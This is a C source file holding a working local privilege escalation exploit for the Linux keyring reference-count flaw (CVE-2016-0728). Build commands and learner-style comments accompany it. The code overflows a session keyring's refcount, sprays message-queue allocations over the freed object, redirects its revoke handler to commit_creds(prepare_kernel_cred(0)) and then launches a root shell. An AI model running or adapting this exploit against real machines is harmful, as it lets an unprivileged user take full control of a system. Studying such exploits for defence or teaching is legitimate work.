/* 
	For ubuntu/debian: 
	$ sudo apt-get install libkeyutils-dev
	$ gcc cve.c -o cve -lkeyutils -Wall 
	$ ./cve_2016_072 PP_KEY 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <keyutils.h>
#include <unistd.h>
#include <time.h>
#include <unistd.h>

#include <sys/ipc.h>
#include <sys/msg.h>

/* __attribute__ specifies a parameter that can't be described in C, something like where
in memory to put something, or what memory boundaries to line it up to. In this case I
think it specifies which register will contain the data (not really sure though) */
typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

/* This is the address of kernel stuff we need, usually consistent across versions */
#define COMMIT_CREDS_ADDR (0xffffffff81094250)
#define PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)

/* This is the length of our payload struct:
 * The first number is the size of struct key_type as defined in kernel source code
 * The second number is the length of the header of the message that will put
 * the payload into kernel space */
#define STRUCT_LEN (0xb8 - 0x30)

/* This is the payload struct: compare it to the real key_type in comments below. 
 * Notice that the last 5 items are removed: This accounts for the 0x30 bytes
 * taken by the message header */
struct key_type {
    char * name;
    size_t datalen;
    void * vet_description;
    void * preparse;
    void * free_preparse;
    void * instantiate;
    void * update;
    void * match_preparse;
    void * match_free;
    void * revoke;
    void * destroy;
};
/*
 * 
struct key_type {
	const char *name;
	size_t def_datalen;
	int (*vet_description)(const char *description);
	int (*preparse)(struct key_preparsed_payload *prep);
	void (*free_preparse)(struct key_preparsed_payload *prep);
	int (*instantiate)(struct key *key, struct key_preparsed_payload *prep);
	int (*update)(struct key *key, struct key_preparsed_payload *prep);
	int (*match_preparse)(struct key_match_data *match_data);
	void (*match_free)(struct key_match_data *match_data);
	void (*revoke)(struct key *key);
	void (*destroy)(struct key *key);
	void (*describe)(const struct key *key, struct seq_file *p);
	long (*read)(const struct key *key, char __user *buffer, size_t buflen);
	request_key_actor_t request_key;
	struct list_head	link;
	struct lock_class_key	lock_class;
};
 * */

/* Userspace function to be executed on calling keytype->revoke(), 
 * assuming other protections are not in place (they are, generally) */
void userspace_revoke(void * key) {
    commit_creds(prepare_kernel_cred(0));
}

int main(int argc, const char *argv[]) {
	/*=============Declare Variables==================================*/
	
	/* Empty vars to be filled later */
    const char *keyring_name;			//name given by argv[1]
    size_t i = 0;
    key_serial_t serial = -1;			//for the first key, set by keyctl() 
    pid_t pid = -1;						//for the forking
    struct key_type * my_key_type = NULL;//for the payload
    
    /* This is part of a scheme to pause the loop on powers of 2
     * 0x100000000/2 = 0x8000000.  Why it's declared this way, I have
     * no idea.  It would break on 32-bit systems */
    unsigned long int l = 0x100000000/2;

    /* This defines the message to be sent that will occupy
     * the freed space.
     * The 0x4141414141414141 is the message type (64-bit long)
     * mtext set to null */
    struct { 
		long mtype;
		char mtext[STRUCT_LEN];
    } msg = {0x4141414141414141, {0}};
    int msqid;

	/*=============Actions============================================*/

	/* Handle error case and initial display */
    if (argc != 2) {
        puts("usage: ./keys <key_name>");
        return 1;
    }
    printf("uid=%d, euid=%d\n", getuid(), geteuid()); 
    
    /* I think this puts the addresses into a register */
    commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;
    prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;
    
    /* Allocate user space struct on heap */
    my_key_type = malloc(sizeof(*my_key_type));
	/* Connect function to struct */
    my_key_type->revoke = (void*)userspace_revoke;
    /* Initialize mtext to all A's */
    memset(msg.mtext, 'A', sizeof(msg.mtext));

	/* Set specific points in mtext to values expected by a function
	 * parsing a key_type struct.
	 * Note: not sure if 56 should be set to current effective id.
	 * If so, why is geteuid() commented out? */
    // key->uid
    *(int*)(&msg.mtext[56]) = 0x3e8; /* geteuid() */
    //key->perm: sets permissions
    *(int*)(&msg.mtext[64]) = 0x3f3f3f3f;
    //key->type: puts a pointer to userspace payload struct at 80
    *(unsigned long *)(&msg.mtext[80]) = (unsigned long)my_key_type;

	/* Create one message: this step is repeated many times later */
    if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
        perror("msgget");
        exit(1);
    }

    keyring_name = argv[1];

    /* Set the new session keyring before we start */

    serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);
    if (serial < 0) {
        perror("keyctl");
        return -1;
    }
	
    if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) < 0) {
	perror("keyctl");
	return -1;
    }

    puts("Increfing...");
    for (i = 1; i < 0xfffffffd; i++) {
        if (i % 50000 == 0) {
            printf("%lf %%\r",(float)i*100/0xfffffffd);
    	}
        if (i == (0xffffffff - l)) {
            l = l/2;
            sleep(5);
        }
        if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
            perror("keyctl");
            return -1;
        }
    }
    sleep(5);
    /* here we are going to leak the last references to overflow */
    for (i=0; i<5; ++i) {
        if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
            perror("keyctl");
            return -1;
        }
    }

    puts("finished increfing");
    puts("forking...");
    /* allocate msg struct in the kernel rewriting the freed keyring object */
    for (i=0; i<64; i++) {
        pid = fork();
        if (pid == -1) {
            perror("fork");
            return -1;
        }

        if (pid == 0) {
            sleep(2);
            if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
                perror("msgget");
                exit(1);
            }
            for (i = 0; i < 64; i++) {
                if (msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == -1) {
                    perror("msgsnd");
                    exit(1);
                }
            }
            sleep(-1);
            exit(1);
        }
    }
   
    puts("finished forking");
    sleep(5);

    /* call userspace_revoke from kernel */
    puts("caling revoke...");
    if (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
        perror("keyctl_revoke");
    }

    printf("uid=%d, euid=%d\n", getuid(), geteuid());
    execl("/bin/sh", "/bin/sh", NULL);

    return 0;
}

